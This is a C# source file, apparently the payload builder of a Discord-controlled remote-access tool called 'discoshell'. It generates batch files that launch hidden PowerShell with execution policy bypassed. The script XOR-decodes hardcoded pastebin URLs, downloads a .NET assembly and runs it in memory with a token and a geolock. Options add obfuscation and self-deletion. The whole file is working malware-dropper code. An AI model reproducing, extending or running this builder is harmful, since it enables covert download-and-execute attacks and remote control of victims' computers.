using System.Text;


namespace discoshell
{
    public class PGen
    {
        private const string dropper_uri = "https://pastebin.com/raw/ytUhetnw";
        private const string payload_uri = "https://pastebin.com/raw/LLqxW7MB";

        public static byte[] Generate(string token, string prefix, bool obf, bool delself, string geolock, bool ponly)
        {
            Random rng = new();
            StringBuilder ret = new();
            Console.WriteLine("Generating...");
            StringBuilder gencode = new();
            gencode.AppendLine("rem disco.shell");
            string command = GenerateCommand(token, prefix, geolock, ponly, rng);
            gencode.AppendLine(command);
            if (delself) gencode.AppendLine("(goto) 2>nul & del \"%~f0\"");
            gencode.AppendLine("exit");

            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine($"Command: {command}");
            Console.ResetColor();

            if (obf)
            {
                Console.WriteLine("Obfuscating...");
                string obfuscated = StringSplit.GenCode(gencode.ToString(), rng, 3);
                ret.AppendLine("@echo off");
                ret.AppendLine("cls");
                ret.Append(obfuscated);
                return Encoding.ASCII.GetBytes(ret.ToString());
            }
            else
            {
                ret.AppendLine("@echo off");
                ret.Append(gencode.ToString());
                return Encoding.ASCII.GetBytes(ret.ToString());
            }
        }

        private static byte[] xorcrypt(byte[] input, string key)
        {
            byte[] keyc = Encoding.UTF8.GetBytes(key);
            for (int i = 0; i < input.Length; i++)
            {
                input[i] = (byte)(input[i] ^ keyc[i]);
            }
            return input;
        }

        private static string RandomString(int length, Random rng)
        {
            string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
            return new string(Enumerable.Repeat(chars, length).Select(s => s[rng.Next(s.Length)]).ToArray());
        }

        public static string GenerateCommand(string token, string prefix, string geolock, bool ponly, Random rng)
        {
            string xorkey = RandomString(payload_uri.Length, rng);
            string varname = RandomString(6, rng);
            string varname2 = RandomString(6, rng);
            string srcvarname = RandomString(6, rng);
            string classname = RandomString(6, rng);
            string functionname = RandomString(6, rng);
            string xorclass = Convert.ToBase64String(Encoding.UTF8.GetBytes(@"using System.Text; public class " + classname + @" { public static byte[] " + functionname + @"(byte[] input, string key) { byte[] keyc = Encoding.UTF8.GetBytes(key); for (int i = 0; i < input.Length; i++) { input[i] = (byte)(input[i] ^ keyc[i]); } return input; } }"));
            return $"powershell -noprofile -executionpolicy bypass -windowstyle hidden -command ${srcvarname} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{xorclass}'));Add-Type -TypeDefinition ${srcvarname};${varname} = New-Object System.Net.WebClient;${varname2} = ${varname}.DownloadData([System.Text.Encoding]::UTF8.GetString(${varname}.DownloadData([System.Text.Encoding]::UTF8.GetString([{classname}]::{functionname}([System.Convert]::FromBase64String('{Convert.ToBase64String(xorcrypt(Encoding.UTF8.GetBytes((ponly ? payload_uri : dropper_uri)), xorkey))}'), '{xorkey}')))));${varname}.Dispose();[System.Reflection.Assembly]::Load(${varname2}).EntryPoint.Invoke($null, (, [string[]] ('{Convert.ToBase64String(Encoding.UTF8.GetBytes(token))}', '{prefix}', '{geolock}')))";
        }
    }
}